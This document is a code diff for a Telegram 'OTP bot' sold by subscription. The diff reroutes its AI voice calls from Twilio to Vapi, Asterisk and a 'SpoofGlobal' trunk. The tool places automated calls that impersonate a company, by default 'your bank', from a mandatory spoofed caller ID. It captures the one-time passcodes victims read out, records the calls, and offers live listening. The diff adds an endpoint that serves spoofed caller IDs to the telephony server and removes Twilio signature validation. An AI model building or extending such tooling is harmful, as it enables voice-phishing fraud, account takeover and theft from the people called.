@@ -6,42 +6,33 @@ Fully debugged with file lock fixes, script creation, OTP capture,
 and complete error feedback.
 
 =============================================================================
-CRITICAL: TWILIO WEBHOOK CONFIGURATION
+CRITICAL: VAPI + ASTERISK + SPOOFGLOBAL TELEPHONY
 =============================================================================
 
-To make the bot work with Twilio:
+All outbound calls are placed through Vapi (SIP phone number resource), which
+INVITEs Asterisk; Asterisk dials out through the SpoofGlobal trunk using the
+operator-supplied caller ID stored in a per-call <E.164>.json CLI file.
 
-1. CREDENTIALS REQUIRED (in .env or conf/settings.txt):
-   - TWILIO_ACCOUNT_SID: Your Twilio Account SID (starts with 'AC')
-   - TWILIO_AUTH_TOKEN: Your Twilio Auth Token (64 character token)
-   - TWILIO_PHONE_NUMBER: Your Twilio phone number (e.g., +1234567890)
-   - NGROK_URL: Your ngrok URL (e.g., https://abc123.ngrok-free.dev)
+1. REQUIRED CREDENTIALS (in .env or conf/settings.txt):
+   - TELEGRAM_BOT_TOKEN: Your Telegram bot token
+   - VAPI_API_KEY: Your Vapi API key
+   - VAPI_SIP_PHONE_NUMBER_ID: Vapi SIP phone number resource used outbound
+   - USE_ASTERISK=true
+   - ASTERISK_TRUNK: SpoofGlobal PJSIP trunk name in Asterisk
+   - ASTERISK_CLI_DIR: Directory shared with the Asterisk AGI/CLI reader
+   - NGROK_URL: Your ngrok URL (for webhooks, e.g. https://abc123.ngrok-free.dev)
 
-2. CONFIGURE WEBHOOKS IN TWILIO CONSOLE:
-   Go to: https://www.twilio.com/console/phone-numbers/incoming
-   - Select your phone number
-   - Under "Voice & Fax":
-     * A Call Comes In → Webhook
-     * URL: {NGROK_URL}/voice
-     * Method: HTTP POST
-   - Configure Status Callback:
-     * URL: {NGROK_URL}/twilio/status
-     * Method: HTTP POST
+2. NO LEGACY CARRIER: There is no legacy carrier account, no owned numbers, no
+   TwiML and no legacy carrier webhook. Call status/termination use the Vapi
+   Call UUID only (Vapi webhooks + GET /call/{id} + end_call).
 
-3. VERIFY YOUR CONFIGURATION:
-   - Make sure NGROK_URL matches exactly what you configured in Twilio
-   - The X-Twilio-Signature header will be validated against AUTH_TOKEN
-   - If validation fails 401, check the debug logs with timestamps
+3. CALLER ID: The caller ID (spoofed CLI) is mandatory and operator-provided.
+   There is no platform default and no number pool. Calls are rejected when no
+   caller ID is supplied.
 
-4. TROUBLESHOOTING:
-   - If you see "application error" → check logs for 401 errors
-   - Enable DISABLE_TWILIO_VALIDATION=true temporarily to test
-   - Check ngrok status: ngrok_url should be active and match webhook URL
-   - Verify AUTH_TOKEN is correct (not truncated)
-
-5. DEBUG MODE:
+4. DEBUG MODE:
    - Set DEBUG=true in .env to see all request details
-   - Check conf/twilio_live_calls.log for all webhook calls
+   - Check conf/bot.log for all webhook calls
 
 =============================================================================
 """
@@ -80,27 +71,23 @@ from urllib3.util.retry import Retry
 import telebot
 from flask import Flask, request, send_file, Response
 from telebot import types
-from twilio.rest import Client
-from twilio.twiml.voice_response import VoiceResponse, Gather, Play, Say, Redirect, Connect, Stream
-from twilio.request_validator import RequestValidator
-from requests.auth import HTTPBasicAuth
 from dotenv import load_dotenv
 from config import (
-    BOT_TOKEN, ACCOUNT_SID, AUTH_TOKEN, TWILIO_PHONE_NUMBER, OUTBOUND_CALLER_ID,
+    BOT_TOKEN,
     NGROK_URL, NGROK_TOKEN,
     MAIN_CHANNEL_URL, BACKUP_CHANNEL_URL, VOUCH_CHANNEL_URL,
     MAIN_CHANNEL_ID, BACKUP_CHANNEL_ID, VOUCH_CHANNEL_ID,
     OWNER_ID, ADMIN_ID, DEVELOPER_IDS,
     FREE_TRIAL_TOTAL, PAYMENT_ADDRESSES,
     LIVE_LISTEN_URL, LIVE_LISTEN_SECRET,
-    DISABLE_TWILIO_VALIDATION, DISABLE_DUMMY_BOT,
+    DISABLE_DUMMY_BOT,
     ABSTRACT_API_KEY,
     RATE_LIMIT_CAPACITY, RATE_LIMIT_REFILL_RATE, RATE_LIMIT_MAX_VIOLATIONS,
     RATE_LIMIT_BASE_BAN_DURATION, RATE_LIMIT_MAX_BAN_DURATION, RATE_LIMIT_BAN_ESCALATION_FACTOR,
     FLASK_HOST, FLASK_PORT, DEBUG,
     USE_WEBHOOK, WEBHOOK_URL, WEBHOOK_PATH, TELEGRAM_API_BASE_URL,
     USE_AI_FLOW, DEFAULT_VOICE_ID, DATABASE_URL, USE_POSTGRES,
-    REQUIRED_CHANNELS, ZOIPER_SIP_URL, build_public_base_url,
+    REQUIRED_CHANNELS, build_public_base_url,
 )
 from telebot.apihelper import ApiTelegramException
 
@@ -140,7 +127,6 @@ def _notify_live_listen_start(call_sid: str, chat_id: Optional[int] = None, user
 # CONFIGURATION — all shared vars imported from config.py above
 # ======================================================================
 LOG_DIR = Path(__file__).parent / "conf"
-TWILIO_REQUEST_LOG = LOG_DIR / "twilio_live_calls.log"
 
 # ======================================================================
 # LOGGING
@@ -203,12 +189,8 @@ import core.entitlements as _ent
 # ======================================================================
 # GLOBAL CLIENTS
 # ======================================================================
-# Prefer services wrapper for Twilio call dispatch to ensure non-blocking behaviour
-from services.twilio_service import get_twilio_client, CALL_QUEUED
-from services.twilio_service import SelfDialError
-from services.proxy_pool import AllLinesBusyError
+from services.call_service import CallerIdRequiredError
 
-twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN) if ACCOUNT_SID and "YOUR_" not in ACCOUNT_SID else None
 # Initialize bot with threaded=True for better concurrency and timeout handling
 bot = telebot.TeleBot(
     BOT_TOKEN,
@@ -346,71 +328,42 @@ def vapi_webhook():
 
 @app.route('/', methods=['GET'])
 def root():
-    return {"status": "ok", "service": "HOTTBOIIHITZZ PREMIUM OTP BOT v4.1", "endpoints": ["/health", "/vapi/webhook", "/telegram_webhook"]}, 200
+    return {"status": "ok", "service": "HOTTBOIIHITZZ PREMIUM OTP BOT v4.1", "endpoints": ["/health", "/vapi/webhook", "/vapi/cli/<e164>", "/telegram_webhook"]}, 200
+
+@app.route('/vapi/cli/<e164>', methods=['GET'])
+def vapi_cli_lookup(e164):
+    """Per-call caller-ID lookup for the Asterisk AGI (read_cli.py).
+
+    Multi-host deployments: the bot writes conf/asterisk_cli/<E.164>.json on
+    its own host (Render), but the AGI runs on the Asterisk VPS. This endpoint
+    lets the AGI pull the caller-ID JSON over HTTP instead of needing shared
+    storage. Auth is a shared token passed in the X-CLI-Token header.
+    """
+    from config import ASTERISK_CLI_API_TOKEN, ASTERISK_CLI_DIR
+    token = request.headers.get('X-CLI-Token', '')
+    if not ASTERISK_CLI_API_TOKEN or not secrets.compare_digest(token, ASTERISK_CLI_API_TOKEN):
+        return {"error": "unauthorized"}, 401
+    digits = re.sub(r"[^\d]", "", e164 or "")
+    if not digits:
+        return {"error": "bad number"}, 400
+    base = Path(ASTERISK_CLI_DIR)
+    for candidate in (f"{digits}.json", f"+{digits}.json", e164):
+        path = base / candidate
+        try:
+            if path.is_file():
+                data = json.loads(path.read_text(encoding="utf-8"))
+                return {
+                    "caller_id": str(data.get("caller_id") or "").strip(),
+                    "display_name": str(data.get("display_name") or "").strip(),
+                }, 200
+        except Exception:
+            break
+    return {"error": "not found"}, 404
 
 @app.route('/health', methods=['GET'])
 def health_check():
     return {"status": "ok"}, 200
 
-
-@app.route('/zoiper', methods=['GET', 'POST'])
-def zoiper_inbound():
-    """TwiML entry point for inbound calls on a Zoiper-routed owned number.
-
-    Any owned Twilio number whose voice URL points at this endpoint will dial
-    out to the registered SIP endpoint (Zoiper) instead of failing with 603.
-    Only used when a purchased number is intended to *receive* calls; pool
-    caller-ID lines never point here.
-    """
-    response = VoiceResponse()
-    dial = response.dial(callerId=request.form.get("From", "") or None)
-    dial.sip(ZOIPER_SIP_URL)
-    return Response(str(response), mimetype="text/xml")
-
-
-@app.route('/sms', methods=['GET', 'POST'])
-def sms_forward():
-    """TwiML/HTTP entry point for inbound SMS on owned Twilio numbers.
-
-    Any owned number whose *Messaging* webhook points at this endpoint will
-    forward the incoming text to all configured admin IDs (OWNER_ID, ADMIN_ID
-    and every DEVELOPER_IDS entry). Media attachments are appended as links so
-    admins can still see MMS content. Returns plain "OK" so Twilio does not
-    retry.
-    """
-    from_number = html.escape((request.values.get("From") or "").strip())
-    to_number = html.escape((request.values.get("To") or "").strip())
-    message_body = html.escape((request.values.get("Body") or "").strip())
-
-    lines = [f"📩 New SMS from {from_number}"]
-    if to_number:
-        lines.append(f"📱 To: {to_number}")
-    if message_body:
-        lines.append(f"\n{message_body}")
-
-    try:
-        num_media = int(request.values.get("NumMedia") or 0)
-    except (TypeError, ValueError):
-        num_media = 0
-    for i in range(num_media):
-        media_url = html.escape((request.values.get(f"MediaUrl{i}") or "").strip())
-        if media_url:
-            lines.append(f"\n📎 Media {i + 1}: {media_url}")
-
-    text = "\n".join(lines)
-    recipients = {chat_id for chat_id in (OWNER_ID, ADMIN_ID) if chat_id is not None}
-    recipients.update(DEVELOPER_IDS)
-
-    sent = 0
-    for chat_id in recipients:
-        try:
-            safe_bot_send_message(chat_id, text, parse_mode="HTML")
-            sent += 1
-        except Exception:
-            logger.exception("Failed to forward inbound SMS to chat_id=%s", chat_id)
-
-    logger.info("Inbound SMS forwarded to %s/%s admins (From=%s To=%s)", sent, len(recipients), from_number, to_number)
-    return "OK", 200
 
 # Polling health state
 _polling_thread = None
@@ -1005,7 +958,7 @@ def build_call_review_text(user_id: str, title: str = "📋 CALL REVIEW") -> str
         voice_key, _, _ = resolve_voice_choice(voice_name)
     voice_style = get_voice_style(voice_key)
 
-    caller_display = caller_id if caller_id else f"{TWILIO_PHONE_NUMBER} (default)"
+    caller_display = caller_id if caller_id else "Not set (caller ID required)"
     return (
         f"{_safe_html(title)}\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -1043,7 +996,7 @@ def build_manual_call_review_text(user_id: str, title: str = "🟢 MANUAL CALL R
     voice_id = read_user_file(user_id, "manual_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
     voice_name = read_user_file(user_id, "manual_voice_name.txt", "Custom") or "Custom"
     otp_len = read_user_file(user_id, "manual_otp_length.txt", "6").strip() or "6"
-    caller_display = caller_id if caller_id else f"{TWILIO_PHONE_NUMBER} (default)"
+    caller_display = caller_id if caller_id else "Not set (caller ID required)"
     script = read_user_file(user_id, "manual_script.txt", "").strip()
     has_reason = bool(read_user_file(user_id, "manual_reason.txt", "").strip())
     script_preview = script if len(script) <= 180 else f"{script[:180]}..."
@@ -1141,7 +1094,7 @@ def build_custom_call_review_text(user_id: str, title: str = "🟢 CUSTOM CALL R
     digits = read_user_file(user_id, "custom_digits.txt", "0").strip() or "0"
     voice_id = read_user_file(user_id, "custom_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
     voice_name = read_user_file(user_id, "custom_voice_name.txt", "Custom") or "Custom"
-    caller_display = caller_id if caller_id else f"{TWILIO_PHONE_NUMBER} (default)"
+    caller_display = caller_id if caller_id else "Not set (caller ID required)"
     script_preview = script if len(script) <= 150 else f"{script[:150]}..."
     return (
         f"{_safe_html(title)}\n"
@@ -1285,273 +1238,6 @@ def clear_user_state(user_id: str) -> None:
     except FileNotFoundError:
         invalidate_cache(user_id, "state.txt")
         pass
-
-# ======================================================================
-# TWILIO REQUEST VALIDATOR
-# ======================================================================
-# TWILIO VALIDATOR INITIALIZATION
-# ======================================================================
-_twilio_validator = None
-_twilio_auth_token = AUTH_TOKEN  # Cache for debugging
-
-def _init_twilio_validator():
-    """Initialize the Twilio request validator safely."""
-    global _twilio_validator
-    
-    # Verify credentials are real
-    if not ACCOUNT_SID or "YOUR_" in str(ACCOUNT_SID):
-        logger.error("[ERROR] Twilio ACCOUNT_SID not configured or is placeholder")
-        return False
-    
-    if not AUTH_TOKEN or "YOUR_" in str(AUTH_TOKEN):
-        logger.error("[ERROR] Twilio AUTH_TOKEN not configured or is placeholder")
-        return False
-    
-    try:
-        _twilio_validator = RequestValidator(AUTH_TOKEN)
-        logger.info("[OK] Twilio RequestValidator initialized successfully")
-        logger.debug(f"Twilio SID: {ACCOUNT_SID[:10]}..., AUTH_TOKEN length: {len(AUTH_TOKEN)}")
-        return True
-    except Exception as e:
-        logger.error(f"[ERROR] Failed to initialize Twilio RequestValidator: {e}")
-        return False
-
-# Initialize validator on startup
-_init_twilio_validator()
-
-def validate_twilio_request():
-    if DISABLE_TWILIO_VALIDATION:
-        logger.info("Twilio validation disabled")
-        return True
-    if not _twilio_validator:
-        logger.warning("Twilio validator not initialized")
-        return True
-    signature = request.headers.get("X-Twilio-Signature", "")
-    if not signature:
-        logger.warning("Missing signature")
-        with open(TWILIO_REQUEST_LOG, "a", encoding="utf-8") as log_file:
-            log_file.write(f"[{datetime.utcnow().isoformat()}Z] Twilio validation failed: missing signature for {request.path}\n")
-        return False
-    params = request.form.to_dict(flat=True)
-    candidates = set()
-    candidates.add(request.url)
-    if request.url.startswith("https://"):
-        candidates.add("http://" + request.url[8:])
-    elif request.url.startswith("http://"):
-        candidates.add("https://" + request.url[7:])
-    if request.url.endswith("/"):
-        candidates.add(request.url.rstrip("/"))
-    else:
-        candidates.add(request.url + "/")
-    if NGROK_URL:
-        base = NGROK_URL.rstrip("/")
-        query = request.query_string.decode("utf-8")
-        fallback = f"{base}{request.path}"
-        if query:
-            fallback += f"?{query}"
-        candidates.add(fallback)
-        if fallback.startswith("https://"):
-            candidates.add("http://" + fallback[8:])
-        elif fallback.startswith("http://"):
-            candidates.add("https://" + fallback[7:])
-        if fallback.endswith("/"):
-            candidates.add(fallback.rstrip("/"))
-        else:
-            candidates.add(fallback + "/")
-    candidates = list(candidates)
-    for url in candidates:
-        try:
-            if _twilio_validator.validate(url, params, signature):
-                return True
-        except Exception:
-            continue
-    logger.warning(f"Validation failed for {request.path}")
-    try:
-        with open(TWILIO_REQUEST_LOG, "a", encoding="utf-8") as log_file:
-            log_file.write(
-                f"[{datetime.utcnow().isoformat()}Z] Twilio validation failed for {request.path}. "
-                f"Signature={signature!r}, candidates={candidates}\n"
-            )
-    except Exception:
-        pass
-    return False
-
-
-def twilio_request_logger(endpoint_name: str):
-    def decorator(func):
-        @wraps(func)
-        def wrapper(*args, **kwargs):
-            log_twilio_request_debug(endpoint_name)
-            try:
-                return func(*args, **kwargs)
-            except Exception as e:
-                logger.exception(f"Twilio endpoint {endpoint_name} failed: {e}")
-                raise
-        return wrapper
-    return decorator
-
-
-def log_twilio_request_debug(endpoint_name: str):
-    try:
-        headers = {k: v for k, v in request.headers.items()}
-        params = request.args.to_dict(flat=False)
-        form = request.form.to_dict(flat=False)
-        message = (
-            f"[{datetime.utcnow().isoformat()}Z] Twilio {endpoint_name} request received: "
-            f"path={request.path}, url={request.url}, method={request.method}, "
-            f"headers={headers}, args={params}, form={form}"
-        )
-        logger.info(message)
-
-        try:
-            LOG_DIR.mkdir(parents=True, exist_ok=True)
-            with open(TWILIO_REQUEST_LOG, "a", encoding="utf-8") as log_file:
-                log_file.write(message + "\n")
-        except Exception as file_error:
-            logger.warning(f"Failed to write Twilio request debug log file: {file_error}")
-    except Exception as e:
-        logger.warning(f"Failed to log Twilio {endpoint_name} request debug info: {e}")
-
-
-# ======================================================================
-# TWILIO CALLBACK ROUTES
-# ======================================================================
-@app.route('/twilio/recording', methods=['POST'])
-@twilio_request_logger('/twilio/recording')
-def twilio_recording_callback():
-    """Handle Twilio recording status callbacks. Downloads the recording and
-    forwards it to the Telegram chat of the original call (`user_id`/`chat_id`)."""
-    try:
-        is_valid = validate_twilio_request()
-        if not is_valid:
-            logger.error("[ERROR] Recording callback: Twilio validation FAILED")
-            return Response("OK", status=200)
-
-        recording_sid = request.form.get("RecordingSid") or request.values.get("RecordingSid")
-        recording_url = request.form.get("RecordingUrl") or request.values.get("RecordingUrl")
-        call_sid = request.form.get("CallSid") or request.values.get("CallSid")
-        user_id = request.args.get("user_id") or request.form.get("user_id") or request.values.get("user_id")
-        chat_id = request.args.get("chat_id") or request.form.get("chat_id") or request.values.get("chat_id")
-
-        logger.info(
-            "Recording callback received: call_sid=%s recording_sid=%s user_id=%s chat_id=%s recording_url=%s",
-            call_sid, recording_sid, user_id, chat_id, recording_url,
-        )
-
-        if not recording_sid or not recording_url or not call_sid:
-            logger.warning("Recording callback missing required fields: %s %s %s", recording_sid, recording_url, call_sid)
-            return Response("OK", status=200)
-
-        url = recording_url
-        if url.endswith('.json'):
-            url = url.replace('.json', '.mp3')
-        elif not url.endswith('.mp3') and not url.endswith('.wav'):
-            url = f"{recording_url}.mp3"
-
-        r = _http.get(url, auth=HTTPBasicAuth(ACCOUNT_SID, AUTH_TOKEN), timeout=30)
-        if r.status_code == 200 and r.content and len(r.content) > 128:
-            session = get_call_session(call_sid) or {}
-            saved_user_id = user_id or session.get("user_id")
-            saved_chat_id = chat_id or session.get("chat_id")
-            if saved_user_id:
-                if not save_and_send_recording(call_sid, saved_user_id, saved_chat_id, r.content):
-                    logger.warning(f"Failed to save/send recording for callback CallSid={call_sid}")
-            else:
-                logger.warning(f"Recording callback has no user_id for CallSid={call_sid}")
-        else:
-            logger.warning(
-                f"Failed to download valid recording {recording_sid}: HTTP {r.status_code}, "
-                f"bytes={len(r.content) if r.content is not None else 'None'}"
-            )
-    except Exception as e:
-        logger.exception("Error in /twilio/recording: %s", e)
-
-    return Response("OK", status=200)
-
-
-@app.route('/twilio/status', methods=['POST'])
-@twilio_request_logger('/twilio/status')
-def twilio_status():
-    """Handle call status updates from Twilio (ringing, in-progress, completed, etc.)."""
-    try:
-        is_valid = validate_twilio_request()
-        if not is_valid:
-            logger.error("[ERROR] Status endpoint: Twilio validation FAILED")
-            return Response("OK", status=200)
-
-        call_sid = request.form.get("CallSid")
-        status = request.form.get("CallStatus")
-        chat_id = request.form.get("chat_id") or request.args.get("chat_id")
-        user_id = request.form.get("user_id") or request.args.get("user_id")
-
-        if not call_sid:
-            logger.warning("Twilio status webhook received without CallSid. Ignoring.")
-            return Response("OK", status=200)
-
-        logger.info(f"📊 Call status update: {call_sid} -> {status} (user_id={user_id} chat_id={chat_id})")
-
-        status_text = None
-        final_status = False
-        if status == "queued":
-            status_text = "⏳ Call queued. Awaiting ring..."
-        elif status == "ringing":
-            status_text = "📞 Ringing..."
-        elif status == "in-progress":
-            status_text = "▶️ Call in progress..."
-        elif status == "completed":
-            status_text = "✅ Call ended."
-            final_status = True
-        elif status == "failed":
-            status_text = "❌ Call failed."
-            final_status = True
-        elif status == "no-answer":
-            status_text = "⏱️ No answer."
-            final_status = True
-        elif status == "busy":
-            status_text = "📵 Line busy."
-            final_status = True
-        elif status == "canceled":
-            status_text = "❌ Call canceled."
-            final_status = True
-
-        if status_text:
-            update_call_status_message(call_sid, status_text, final=final_status)
-
-        if final_status:
-            try:
-                from services.proxy_pool import proxy_pool
-                released = proxy_pool.release_by_sid(call_sid)
-                if released:
-                    logger.info("[NUMBER_POOL] freed number for call %s (status=%s)", call_sid, status)
-            except Exception as release_exc:
-                logger.warning("[NUMBER_POOL] release failed for call %s: %s", call_sid, release_exc)
-
-        if status == "completed" and call_sid:
-            try:
-                session = get_call_session(call_sid) or {}
-                answered_by = session.get("answered_by")
-                event_type = (
-                    "Machine" if answered_by and "machine" in answered_by.lower()
-                    else "Voicemail" if answered_by and "voicemail" in answered_by.lower()
-                    else "Completed"
-                )
-                summary = (
-                    f"✅ Call ended.\n"
-                    f"Detected: {event_type}\n"
-                    f"CallSid: <code>{call_sid}</code>\n"
-                )
-                if not update_call_status_message(call_sid, summary, final=True):
-                    kb = types.InlineKeyboardMarkup()
-                    kb.add(types.InlineKeyboardButton("Main Menu", callback_data="show_main_menu"))
-                    if chat_id:
-                        safe_bot_send_message(int(chat_id), summary, reply_markup=kb, parse_mode="HTML")
-            except Exception as summ_ex:
-                logger.warning(f"Failed to send final call summary: {summ_ex}")
-    except Exception as e:
-        logger.error(f"[ERROR] Error in /twilio/status endpoint: {e}", exc_info=True)
-
-    return Response("OK", status=200)
-
 
 # ======================================================================
 # In-memory session manager for tracking active call sessions.
@@ -1773,7 +1459,7 @@ def get_call_code_length(call_sid: str, user_id: str) -> int:
 
 
 def get_request_voice_info(call_sid: str, user_id: str = "unknown") -> tuple[str, str]:
-    """Prefer voice_id supplied on the incoming Twilio request, then fallback to session/user defaults."""
+    """Prefer voice_id supplied on the incoming webhook request, then fallback to session/user defaults."""
     voice_id = request.values.get("voice_id") or request.args.get("voice_id") or ""
     if voice_id:
         voice_name = read_user_file(user_id, "VoiceName.txt", "") or get_voice_key_by_id(voice_id) or ""
@@ -1998,7 +1684,7 @@ def notify_amd_unknown(call_sid: str, user_id: Optional[str], chat_id: Optional[
 
 
 def save_and_send_recording(call_sid: str, user_id: Optional[str], chat_id: Optional[int], content: bytes) -> bool:
-    """Save a Twilio recording to user files and auto-send it to chat."""
+    """Save a call recording to user files and auto-send it to chat."""
     if not user_id or not content or len(content) <= 128:
         logger.warning(f"Invalid recording save request: call_sid={call_sid} user_id={user_id} size={len(content) if content else 0}")
         return False
@@ -2035,32 +1721,6 @@ def save_and_send_recording(call_sid: str, user_id: Optional[str], chat_id: Opti
     except Exception as e:
         logger.warning(f"Failed to save/send recording for call {call_sid}: {e}")
         return False
-
-
-def fetch_twilio_recording(call_sid: str, attempts: int = 3, delay: float = 2.0) -> Optional[bytes]:
-    """Fetch a Twilio recording MP3 for a call, retrying until the file is available."""
-    try:
-        for attempt in range(attempts):
-            recordings = twilio_client.calls(call_sid).recordings.list(limit=1)
-            if not recordings:
-                logger.debug(f"No Twilio recordings found for {call_sid} on attempt {attempt + 1}")
-                time.sleep(delay)
-                continue
-
-            recording_url = recordings[0].uri.replace('.json', '.mp3')
-            logger.info(f"Fetching Twilio recording for CallSid={call_sid} attempt={attempt + 1}: {recording_url}")
-            r = _http.get(
-                f"https://api.twilio.com{recording_url}",
-                auth=HTTPBasicAuth(ACCOUNT_SID, AUTH_TOKEN),
-                timeout=REQ_TIMEOUT
-            )
-            if r.status_code == 200 and r.content and len(r.content) > 128:
-                return r.content
-            logger.debug(f"Invalid Twilio recording response for {call_sid}: status={r.status_code} size={len(r.content) if r.content else 0}")
-            time.sleep(delay)
-    except Exception as e:
-        logger.warning(f"Error fetching Twilio recording for {call_sid}: {e}")
-    return None
 
 
 def send_call_stage_status(chat_id, stage, text):
@@ -2549,18 +2209,17 @@ def validate_live_listen_request() -> bool:
     return token == LIVE_LISTEN_SECRET
 
 # ======================================================================
-# TWILIO CONFIG CHECK
+# TELEPHONY CONFIG CHECK
 # ======================================================================
-def is_twilio_configured() -> bool:
-    if not ACCOUNT_SID or "YOUR_" in ACCOUNT_SID:
+def is_telephony_configured() -> bool:
+    from config import VAPI_API_KEY, VAPI_SIP_PHONE_NUMBER_ID, ASTERISK_CLI_DIR
+    if not VAPI_API_KEY or "YOUR_" in VAPI_API_KEY:
         return False
-    if not AUTH_TOKEN or "YOUR_" in AUTH_TOKEN:
+    if not VAPI_SIP_PHONE_NUMBER_ID:
         return False
-    if not TWILIO_PHONE_NUMBER or "1234567890" in TWILIO_PHONE_NUMBER:
+    if not ASTERISK_CLI_DIR:
         return False
-    if not NGROK_URL or "your-ngrok-url" in NGROK_URL:
-        return False
-    return NGROK_URL.startswith("http")
+    return True
 
 # ======================================================================
 # CARRIER LOOKUP
@@ -2712,17 +2371,17 @@ def _place_mode_ai_call(
     status_message_id: Optional[int] = None,
     from_name: Optional[str] = None,
 ) -> str:
-    """Place a call through the modern Vapi-bypass pipeline (like Normal Call).
+    """Place a call through the modern Vapi SIP -> Asterisk pipeline (like Normal Call).
 
     Builds CallMetadata from user settings, optionally injecting a custom script
     as custom instructions, then calls place_ai_call so the call gets the same
     session registration, OTP/transcript handling, live-listen bootstrap and
-    recording as the Normal flow. Returns the Twilio SID.
+    recording as the Normal flow. Returns the Vapi call UUID.
     """
     from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
     from services.prompt_builder import PromptBuilder
     from services.voice_identity import select_agent_name
-    from services.twilio_service import place_ai_call
+    from services.call_service import place_ai_call, CallerIdRequiredError
 
     name = read_user_file(user_id, "Name.txt", "Customer")
     company = read_user_file(user_id, "Company Name.txt", "your bank")
@@ -2773,7 +2432,7 @@ def _place_mode_ai_call(
     overrides = metadata.to_vapi_assistant_overrides()
     overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
 
-    resolved_caller = caller_id or read_user_file(user_id, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
+    resolved_caller = caller_id or read_user_file(user_id, "Caller ID.txt", "").strip()
     try:
         sid = place_ai_call(
             to=to,
@@ -2799,11 +2458,8 @@ def _place_mode_ai_call(
             status_chat_id=chat_id,
             status_message_id=status_message_id,
         )
-    except AllLinesBusyError:
-        logger.warning("[NUMBER_POOL] busy; skipping %s (mode=%s)", to, mode_label)
-        return ""
-    except SelfDialError:
-        logger.warning("[SELF_DIAL] destination %s is one of our own Twilio numbers (mode=%s)", to, mode_label)
+    except CallerIdRequiredError as e:
+        logger.warning("[CALLER_ID] %s (mode=%s) to=%s", e, mode_label, to)
         return ""
     return sid
 
@@ -2823,7 +2479,7 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
             bot.send_message(chat_id, "❌ Invalid or missing target phone number.")
             return
 
-        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
+        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip()
         emotion = emotion.lower() if emotion else "neutral"
         bot.send_message(chat_id, f"🎭 Starting AI Emotion Call ({emotion}). Live listen will be available shortly.")
 
@@ -2832,7 +2488,7 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
                 from services.prompt_builder import PromptBuilder
                 from services.voice_identity import select_agent_name
-                from services.twilio_service import place_ai_call
+                from services.call_service import place_ai_call, CallerIdRequiredError
                 
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
@@ -2885,17 +2541,17 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 prompt_builder = PromptBuilder()
                 system_prompt = prompt_builder.build(metadata)
 
-                # Create Vapi bypass session and place the call via Twilio.
+                # Create the Vapi SIP call (Vapi -> Asterisk -> SpoofGlobal).
                 overrides = metadata.to_vapi_assistant_overrides()
                 overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
-                twilio_sid = place_ai_call(
+                vapi_call_id = place_ai_call(
                     to=phonenum,
                     user_id=user_id_str,
                     chat_id=chat_id,
                     customer_name=name,
                     assistant_overrides=overrides,
                     metadata=metadata.internal,
-                    from_number=caller_id or OUTBOUND_CALLER_ID,
+                    from_number=caller_id,
                     caller_id=caller_id,
                     record=True,
                     endpoint="/initiate_emotion_call",
@@ -2904,25 +2560,13 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                     emotion=emotion,
                     status_chat_id=chat_id,
                     status_message_id=status_message_id,
-                    queue_on_busy=True,
-                    queue_key=f"emotion-{user_id_str}",
                 )
-                if twilio_sid is CALL_QUEUED:
-                    try:
-                        bot.send_message(
-                            chat_id,
-                            "⚠️ <b>ALL LINES BUSY</b>\n\nAll numbers are currently active on other calls. Your call is <b>queued</b> and will start automatically as soon as a line frees up (max 2 minutes).",
-                            parse_mode="HTML",
-                        )
-                    except Exception:
-                        pass
-                    return
-                if not twilio_sid:
-                    raise Exception("Failed to place AI emotion call via Twilio")
+                if not vapi_call_id:
+                    raise Exception("Failed to place AI emotion call via Vapi")
                 
                 bot.send_message(
                     chat_id,
-                    f"🎭 Call ID: {twilio_sid}"
+                    f"🎭 Call ID: {vapi_call_id}"
                 )
                 
                 try:
@@ -2933,7 +2577,12 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 if current_hash:
                     _write_last_setup_hash(user_id_str, current_hash)
                 
-                logger.info(f"✅ Twilio emotion call {twilio_sid} initiated for user {user_id_str}")
+                logger.info(f"✅ Vapi emotion call {vapi_call_id} initiated for user {user_id_str}")
+            except CallerIdRequiredError as e:
+                try:
+                    bot.send_message(chat_id, f"❌ Caller ID required: {e}")
+                except Exception:
+                    pass
             except Exception as e:
                 try:
                     bot.send_message(chat_id, f"❌ Failed to initiate emotion call: {e}")
@@ -2978,7 +2627,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 bot.send_message(chat_id, "❌ Free trial exhausted. Purchase a subscription to continue.")
                 return
 
-        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
+        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip()
 
         def _start():
             try:
@@ -3067,16 +2716,16 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 overrides = metadata.to_vapi_assistant_overrides()
                 overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
 
-                # Place the call via Twilio; Vapi (bypass) only does STT/LLM/TTS.
-                from services.twilio_service import place_ai_call, CALL_QUEUED
-                twilio_sid = place_ai_call(
+                # Place the call via Vapi SIP -> Asterisk -> SpoofGlobal.
+                from services.call_service import place_ai_call, CallerIdRequiredError
+                vapi_call_id = place_ai_call(
                     to=phonenum,
                     user_id=user_id_str,
                     chat_id=chat_id,
                     customer_name=name,
                     assistant_overrides=overrides,
                     metadata=metadata.internal,
-                    from_number=caller_id or OUTBOUND_CALLER_ID,
+                    from_number=caller_id,
                     caller_id=caller_id,
                     record=True,
                     endpoint="/initiate_normal_call",
